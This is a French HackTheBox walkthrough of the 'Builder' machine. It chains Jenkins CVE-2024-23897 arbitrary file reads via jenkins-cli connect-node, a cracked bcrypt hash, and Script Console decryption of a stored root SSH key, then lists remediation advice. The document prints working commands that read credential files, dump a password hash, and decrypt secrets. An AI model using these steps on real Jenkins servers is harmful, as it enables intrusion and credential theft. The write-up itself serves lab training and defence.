# Builder — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Linux |
| **Difficulté** | 🟡 Medium |
| **Date** | 2026-10-11 |
| **Vecteur** | Jenkins **CVE-2024-23897** (lecture de fichiers via CLI `@file`) → hash bcrypt de jennifer cracké → login admin (FullControlOnceLoggedIn) → **Script Console** déchiffre la clé SSH root stockée → `ssh root` |
| **CVE** | CVE-2024-23897 (Jenkins) |
| **Tags** | web · jenkins · cve-2024-23897 · file-read · bcrypt · secret-decryption · script-console |

> 🎯 **Nouveautés apprises** :
> 1) **CVE-2024-23897** : l'argument `@fichier` du CLI Jenkins → **lecture de fichiers arbitraires** non authentifiée. La commande **`connect-node`** dump un fichier **ligne par ligne** (là où `help` tronque / plante sur les gros fichiers).
> 2) Jenkins = **HudsonPrivateSecurityRealm** → hashs **bcrypt** stockés dans `users/<id>/config.xml` → hashcat `-m 3200`.
> 3) **FullControlOnceLoggedIn** = tout compte connecté est **admin** → accès **Script Console**.
> 4) **Déchiffrer un secret Jenkins** sans sortir master.key : le faire faire par Jenkins lui-même via `hudson.util.Secret.decrypt()` dans la Script Console.

---

## TL;DR
1. nmap → Jenkins 2.441 sur `:8080` (vulnérable CVE-2024-23897).
2. `jenkins-cli.jar` + `connect-node "@/fichier"` → lecture arbitraire.
3. `users/users.xml` → dossier `jennifer_12108429903186576833` → son `config.xml` → bcrypt `$2a$10$UwR7...`.
4. `hashcat -m 3200` → **princess**.
5. Login `jennifer:princess` → admin (FullControlOnceLoggedIn) → **Script Console**.
6. `println(hudson.util.Secret.decrypt('{AQAA...}'))` → clé SSH privée **root** en clair → `ssh -i root_key root@IP` → user.txt + root.txt.

## 1. Reconnaissance
```bash
┌──(kali㉿kali)-[~/nmap/Builder]
└─$ nmap -sC -sV -p- <IP>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
8080/tcp open  http    Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
```
Jenkins exposé → vérifier la version (bas de page / `/api`) : **2.441** = vulnérable à **CVE-2024-23897**.

## 2. Foothold — lecture de fichiers (CVE-2024-23897)
```bash
# client CLI officiel, exposé par Jenkins lui-même
└─$ wget http://<IP>:8080/jnlpJars/jenkins-cli.jar

# lecture arbitraire : connect-node interprète CHAQUE LIGNE du fichier comme un nom d'agent
# -> renvoie "No such agent "<ligne>"" pour chaque ligne = dump complet
└─$ java -jar jenkins-cli.jar -s http://<IP>:8080/ connect-node "@/var/jenkins_home/users/users.xml" 2>&1
   <string>jennifer_12108429903186576833</string>: No such agent "..."    # <-- dossier de jennifer
   <string>jennifer</string>: No such agent "..."

# config globale : realm + stratégie d'autorisation
└─$ java -jar jenkins-cli.jar -s http://<IP>:8080/ -http connect-node "@/var/jenkins_home/config.xml"
   <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">              # comptes gérés par Jenkins (bcrypt sur disque)
   <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">  # tout loggé = ADMIN
   <version>2.441</version>

# hash bcrypt de jennifer
└─$ java -jar jenkins-cli.jar -s http://<IP>:8080/ -http \
    connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml" 2>&1 | grep -i passwordHash
   <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>

# cassage bcrypt -> mode 3200
└─$ echo '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a' > jen.hash
└─$ hashcat -m 3200 jen.hash /usr/share/wordlists/rockyou.txt
   $2a$10$UwR7...:princess
```
> On lit aussi `credentials.xml` : une **clé SSH privée pour `root`**, mais **chiffrée** → `<privateKey>{AQAAABAAAAowLrfC...（~4 Ko de base64 tronqué）...aMR8IMMaKSM=}</privateKey>` + `<username>root</username>`. C'est la cible du privesc. `secrets/master.key` est lisible mais **inutile seul** (il faut aussi `hudson.util.Secret`, binaire → illisible via la LFI).

## 3. Privesc — déchiffrer la clé SSH via la Script Console
Login web sur `http://<IP>:8080` en **`jennifer:princess`**. Grâce à `FullControlOnceLoggedIn`, jennifer est **admin** → accès à **Manage Jenkins → Script Console**.

On ne sort PAS master.key : on demande à **Jenkins de déchiffrer son propre secret** (il détient master.key + hudson.util.Secret) :
```groovy
// Script Console (Groovy)
println(hudson.util.Secret.decrypt('{AQAAABAAAAowLrfCrZx9baWliwrtCiwCyztaYVoYdkPrn5qEEYDqj5frZLuo4qcqH61...}'))
// -> affiche la clé SSH privée root EN CLAIR (-----BEGIN OPENSSH PRIVATE KEY----- ...)
```
```bash
┌──(kali㉿kali)-[~/nmap/Builder]
└─$ nano root_key          # coller la clé affichée par la Script Console
└─$ chmod 600 root_key     # SSH refuse une clé trop permissive
└─$ ssh -i root_key root@<IP>
# -> root : user.txt ET root.txt (le credential stocké était directement pour root)
```

## 4. Remédiation
- **Patcher Jenkins** (CVE-2024-23897 corrigée en 2.442 / LTS 2.426.3) ; désactiver l'accès **CLI** si inutile.
- Ne pas exposer l'interface Jenkins sans réseau de confiance / auth forte en amont.
- Stocker les secrets dans un **coffre externe** (HashiCorp Vault, credentials provider) plutôt que `credentials.xml` chiffré par une master.key présente sur le même disque.
- `FullControlOnceLoggedInAuthorizationStrategy` est dangereux : un simple compte = admin. Utiliser une **autorisation matricielle** par rôle.
- Mots de passe forts : `princess` tombe en secondes en bcrypt.

## 5. Leçons
- Une **« simple lecture de fichier »** non authentifiée = compromission totale si on vise les bons fichiers (users.xml → config.xml → credentials.xml).
- **`connect-node` > `help`** pour la CVE : `help @file` ne rend que la 1re ligne et **plante sur les gros fichiers** (explosion « too many arguments ») ; `connect-node @file` dump **toutes les lignes**.
- Jenkins = **HudsonPrivateSecurityRealm** → hashs **bcrypt** (`-m 3200`) dans `users/<id>/config.xml`, le nom de dossier venant de `users/users.xml`.
- Un **secret Jenkins** (`{AQAA...}`) se déchiffre offline avec `master.key` + `hudson.util.Secret`, **ou** — bien plus simple — en le faisant déchiffrer par Jenkins via la **Script Console** (`hudson.util.Secret.decrypt`).
- Le credential stocké pointait sur **root** → pas de privesc supplémentaire, le SSH donne direct les deux flags.

## ⚠️ Pièges rencontrés
- PoC python au **framing fait main** : `help` tronque et **timeout** sur `config.xml`/`users.xml` (gros fichiers). Solution = `jenkins-cli.jar` officiel + `connect-node`.
- `master.key` / `hudson.util.Secret` sont **binaires** → `connect-node` les ressort illisibles → inutile d'insister pour le déchiffrement offline, passer par la Script Console.
- `ssh -i root_key` : penser au **`chmod 600`** sinon SSH refuse la clé.

## Références
- Fiches liées : [jenkins](../outils/jenkins.md) · [hashcat](../outils/hashcat.md) · [searchsploit](../outils/searchsploit.md) · [linux-privesc](../outils/linux-privesc.md)
